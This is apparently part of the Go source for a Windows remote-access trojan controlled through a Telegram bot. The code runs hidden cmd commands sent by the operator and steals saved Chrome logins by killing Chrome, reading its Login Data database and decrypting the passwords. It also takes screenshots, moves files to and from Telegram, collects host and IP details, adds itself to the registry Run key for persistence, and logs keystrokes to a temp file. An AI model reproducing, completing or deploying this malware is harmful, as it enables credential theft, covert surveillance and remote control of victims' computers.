package main

import (
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/json"
	"fmt"
	"image/png"
	"io"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"unicode/utf8"
	"unsafe"

	"github.com/TheTitanrain/w32"
	_ "github.com/mattn/go-sqlite3"
	"github.com/vova616/screenshot"
	"golang.org/x/sys/windows/registry"
	tgbotapi "gopkg.in/telegram-bot-api.v4"
)

//import "gopkg.in/telegram-bot-api.v4"
/*
func sendMsg(chat_id int64, text string){
	msg := tgbotapi.NewMessage(chat_id, text)
	//msg.ReplyToMessageID = chat_id
	bot.Send(msg)
}*/
var keyloggerRunning = true

func listDir(path string) []string {
	dir, _ := os.Open(path)
	defer dir.Close()
	fi, _ := dir.Stat()
	filenames := make([]string, 0)
	if fi == nil {
		return filenames
	}
	if fi.IsDir() {
		fis, _ := dir.Readdir(-1) // -1 means return all the FileInfos
		for _, fileinfo := range fis {
			if !fileinfo.IsDir() {
				filenames = append(filenames, fileinfo.Name())
			} else {
				filenames = append(filenames, fileinfo.Name()+"/")
			}
		}
	}
	return filenames
}

func arrToStr(sep string, arr []string) string {
	out := ""
	for _, el := range arr {
		out += el + sep
	}
	return out
}

func clearMSG(s string) string {
	if !utf8.ValidString(s) {
		v := make([]rune, 0, len(s))
		for i, r := range s {
			if r == utf8.RuneError {
				_, size := utf8.DecodeRuneInString(s[i:])
				if size == 1 {
					continue
				}
			}
			v = append(v, r)
		}
		s = string(v)
	}
	return s
}

func runCmd(command string, caller int64, api *tgbotapi.BotAPI) {
	cmd := exec.Command("cmd", "/Q", "/C", arrToStr(" ", strings.Split(command, " ")[1:]))
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	out, _ := cmd.Output()
	log.Println("output:", out)
	sendMsg(api, caller, "Done executing cmd:"+clearMSG(arrToStr(" ", strings.Split(command, " ")[1:])+":"+string(out)))
	log.Println("RUNNED SENT MSG!!!!" + clearMSG(arrToStr(" ", strings.Split(command, " ")[1:])+":"+string(out)))
}

func remove(slice []int, s int) []int {
	return append(slice[:s], slice[s+1:]...)
}

func getInfo() string {
	msg := ""
	hName, _ := os.Hostname()
	currUser, _ := user.Current()
	ipCfg, err := GetExternalIP()
	ipInfo := parseIpInfo(ipCfg)
	if err != nil {
		ipInfo = "unknown"
	}
	msg += strings.Split(currUser.Username, "\\")[1] + "@" + hName + "\n"
	msg += runtime.GOOS + "\n"
	msg += "IP info:\n"
	msg += "Internal:" + GetOutboundIP() + "\n"
	msg += "External info: " + ipInfo
	return msg
}

func NewBlob(d []byte) *DATA_BLOB {
	if len(d) == 0 {
		return &DATA_BLOB{}
	}
	return &DATA_BLOB{
		pbData: &d[0],
		cbData: uint32(len(d)),
	}
}

func DecryptDAPI(data []byte) ([]byte, error) {
	dllCrypt := syscall.NewLazyDLL("Crypt32.dll")
	dllKernel := syscall.NewLazyDLL("Kernel32.dll")
	procDecryptData := dllCrypt.NewProc("CryptUnprotectData")
	procLocalFree := dllKernel.NewProc("LocalFree")
	var outBlob DATA_BLOB
	r, _, err := procDecryptData.Call(uintptr(unsafe.Pointer(NewBlob(data))), 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&outBlob)))
	if r == 0 {
		return nil, err
	}
	defer procLocalFree.Call(uintptr(unsafe.Pointer(outBlob.pbData)))
	return outBlob.ToByteArray(), nil
}

func DecryptAES(crypted, key, nounce []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	blockMode, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	origData, err := blockMode.Open(nil, nounce, crypted, nil)
	if err != nil {
		return nil, err
	}
	return origData, nil
}

func Decrypt(data []byte) ([]byte, error) {
	var outblob DATA_BLOB
	r, _, err := procDecryptData.Call(uintptr(unsafe.Pointer(NewBlob(data))), 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&outblob)))
	if r == 0 {
		return nil, err
	}
	defer procLocalFree.Call(uintptr(unsafe.Pointer(outblob.pbData)))
	return outblob.ToByteArray(), nil
}

func getChrome() string {
	currUser, _ := user.Current()
	var url, username, password string
	var out strings.Builder

	killChromeCommand := "taskkill /F /IM chrome.exe /T"
	cmd := exec.Command("cmd", "/Q", "/C", killChromeCommand)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmdout, _ := cmd.Output()
	out.WriteString(string(cmdout))

	path := "C:\\Users\\" + strings.Split(currUser.Username, "\\")[1] + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
	db, err := sql.Open("sqlite3", path)

	if err != nil {
		return err.Error()
	}
	rows, err := db.Query("SELECT origin_url,username_value,password_value from logins;")
	if err != nil {
		return err.Error()
	}

	for rows.Next() {
		rows.Scan(&url, &username, &password)
		pwd, err := Decrypt([]byte(password))
		if err != nil {
			out.WriteString("err:" + err.Error())
		}
		out.WriteString(fmt.Sprintf("uri: %s; username: %s; password: %s\n", url, username, string(pwd)))
	}
	return out.String()
}

func splitMessage(msg string) []string {
	msgBytes := []byte(msg)
	out := []string{}
	for i := 0; i <= len(msgBytes); i += 3048 {
		chunk := ""
		for j := 0; j < 3048; j++ {
			//log.Println("i+j=",i+j,"; len(msg)=",len(msgBytes))
			if i+j >= len(msgBytes) {
				break
			} else {
				chunk += string(msgBytes[i+j])
			}
		}
		out = append(out, chunk)
	}
	return out
}

func GetOutboundIP() string {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return "unknown"
	}
	defer conn.Close()
	localAddr := conn.LocalAddr().String()
	idx := strings.LastIndex(localAddr, ":")
	return localAddr[0:idx]
}

func GetExternalIP() (*IpConfig, error) {
	addr := "http://ifconfig.co/json"
	hc := http.Client{}
	ipCfg := new(IpConfig)
	req, err := http.NewRequest("GET", addr, nil)
	out, err := hc.Do(req)
	outp, err := ioutil.ReadAll(out.Body)
	log.Println("response: ", string(outp))
	if err != nil {
		return ipCfg, err
	}
	json.Unmarshal(outp, ipCfg)
	return ipCfg, nil
}

func makeScreenshot(path string) {
	img, _ := screenshot.CaptureScreen()
	f, _ := os.Create(path)
	png.Encode(f, img)
	f.Close()
}

func uploadFile(chat int64, file string, api *tgbotapi.BotAPI, remove bool) {
	msg := tgbotapi.NewDocumentUpload(chat, file)
	api.Send(msg)
	if remove {
		os.Remove(file)
	}
}

func parseIpInfo(ipCfg *IpConfig) string {
	out := ""
	out += "Ip: " + ipCfg.Ip + "\n"
	out += "Country: " + ipCfg.Country + "\n"
	out += "City: " + ipCfg.City + "\n"
	out += "Outbond hostname: " + ipCfg.Hostname + "\n"
	return out
}

func dlFile(id string, name string, api *tgbotapi.BotAPI) string {
	url, err := api.GetFileDirectURL(id)
	out := new(os.File)
	if runtime.GOOS == "windows" {
		out, err = os.Create(pwd + "\\" + name)
	} else {
		out, err = os.Create(pwd + "/" + name)
	}
	defer out.Close()
	resp, err := http.Get(url)
	defer resp.Body.Close()
	_, err = io.Copy(out, resp.Body)
	if err != nil {
		return "(no)(" + err.Error() + ")"
	}
	if runtime.GOOS == "windows" {
		return pwd + "\\" + name
	} else {
		return pwd + "/" + name
	}
}

func CheckRegistryProgram() (value string, result bool) {
	value, err := GetRegistryKeyValue(registry.CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", nameFile)
	if err == nil {
		return value, true
	} else {
		return "", false
	}
}

func CheckError(err error) bool {
	return err != nil
}

func OutMessage(str string) {
	log.Println(str)
}

func RegistryFromConsole(usingAutorun bool, usingRegistry bool, rewriteExe bool) bool {
	value, flag := CheckRegistryProgram()
	OutMessage("Program autorun:" + value + ", flag = " + strconv.FormatBool(flag) + ", checkFile = " + strconv.FormatBool(CheckFileExist(value)))
	if !flag || !CheckFileExist(value) {
		var out []byte
		if rewriteExe {
			cmd := exec.Command("cmd", "/Q", "/C", "mkdir", fullPathBotDir)
			//cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			out, _ = cmd.Output()
			OutMessage(string(out))
			cmd = exec.Command("cmd", "/Q", "/C", "move", "/Y", fullPathBotSourceExecFile, fullPathBotExecFile)
			//cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			out, _ = cmd.Output()
			OutMessage(string(out))

			/*	if CheckFileExist(fullPathBotSourceExecFile) {
				DeleteFile(fullPathBotSourceExecFile)
			}*/

		} else {
			OutMessage("Rewrite EXE off ")
		}

		if usingRegistry {
			cmd := exec.Command("cmd", "/Q", "/C", "reg", "add", "HKCU\\Software\\"+botDir, "/f")
			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			out, _ = cmd.Output()
			OutMessage(string(out))
		} else {
			OutMessage("Save tokens to registry off")
		}
		if usingAutorun {
			cmd := exec.Command("cmd", "/Q", "/C", "reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", nameFile, "/d", fullPathBotExecFile)
			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			out, _ = cmd.Output()
			OutMessage(string(out))
		} else {
			OutMessage("Using autorun off ")
		}
		return true
	} else {
		return false
	}
}

func UnRegistryFromConsole(usingRegistry bool) {
	var out []byte

	cmd := exec.Command("cmd", "/Q", "/C", "rd", "/S", "/Q", fullPathBotDir)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	out, _ = cmd.Output()
	OutMessage(string(out))

	if usingRegistry {
		cmd = exec.Command("cmd", "/Q", "/C", "reg", "delete", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/f", "/v", nameFile)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		out, _ = cmd.Output()
		OutMessage(string(out))

		cmd = exec.Command("cmd", "/Q", "/C", "reg", "delete", "HKCU\\Software\\"+botDir, "/f")
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		out, _ = cmd.Output()
		OutMessage(string(out))
	}

}

func UnRegisterFromProgram() {
	UnRegisterAutoRun()
	RemoveDirWithContent(fullPathBotDir)
}

func RegisterAutoRun() error {
	err := WriteRegistryKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, nameFile, fullPathBotExecFile)
	CheckError(err)
	return err
}

func UnRegisterAutoRun() {
	DeleteRegistryKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, nameFile)
}

var (
	moduser32 = syscall.NewLazyDLL("user32.dll")

	procGetKeyboardLayout     = moduser32.NewProc("GetKeyboardLayout")
	procGetKeyboardState      = moduser32.NewProc("GetKeyboardState")
	procToUnicodeEx           = moduser32.NewProc("ToUnicodeEx")
	procGetKeyboardLayoutList = moduser32.NewProc("GetKeyboardLayoutList")
	procMapVirtualKeyEx       = moduser32.NewProc("MapVirtualKeyExW")
	procGetKeyState           = moduser32.NewProc("GetKeyState")
)

func NewKeylogger() Keylogger {
	kl := Keylogger{}

	return kl
}

// Keylogger represents the keylogger
type Keylogger struct {
	lastKey int
}

// Key is a single key entered by the user
type Key struct {
	Empty   bool
	Rune    rune
	Keycode int
}

func (kl *Keylogger) GetKey() Key {
	activeKey := 0
	var keyState uint16
	for i := 0; i < 256; i++ {
		keyState = w32.GetAsyncKeyState(i)
		if keyState&(1<<15) != 0 && !(i < 0x2F && i != 0x20) && (i < 160 || i > 165) && (i < 91 || i > 93) {
			activeKey = i
			break
		}
	}
	if activeKey != 0 {
		if activeKey != kl.lastKey {
			kl.lastKey = activeKey
			key := Key{Empty: false, Keycode: activeKey}
			outBuf := make([]uint16, 1)
			kbState := make([]uint8, 256)
			kbLayout, _, _ := procGetKeyboardLayout.Call(uintptr(0))

			if w32.GetAsyncKeyState(w32.VK_SHIFT)&(1<<15) != 0 {
				kbState[w32.VK_SHIFT] = 0xFF
			}

			capitalState, _, _ := procGetKeyState.Call(uintptr(w32.VK_CAPITAL))
			if capitalState != 0 {
				kbState[w32.VK_CAPITAL] = 0xFF
			}

			if w32.GetAsyncKeyState(w32.VK_CONTROL)&(1<<15) != 0 {
				kbState[w32.VK_CONTROL] = 0xFF
			}

			if w32.GetAsyncKeyState(w32.VK_MENU)&(1<<15) != 0 {
				kbState[w32.VK_MENU] = 0xFF
			}

			_, _, _ = procToUnicodeEx.Call(
				uintptr(activeKey),
				uintptr(0),
				uintptr(unsafe.Pointer(&kbState[0])),
				uintptr(unsafe.Pointer(&outBuf[0])),
				uintptr(1),
				uintptr(1),
				uintptr(kbLayout))

			key.Rune, _ = utf8.DecodeRuneInString(syscall.UTF16ToString(outBuf))

			// Append the pressed key to the log file
			file, err := os.OpenFile(os.TempDir()+"\\keylog.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
			if err != nil {
				log.Println(err)
			}
			defer file.Close()
			if _, err := file.WriteString(string(key.Rune)); err != nil {
				log.Println(err)
			}
			return key
		}
	} else {
		kl.lastKey = 0
	}
	return Key{Empty: true}
}
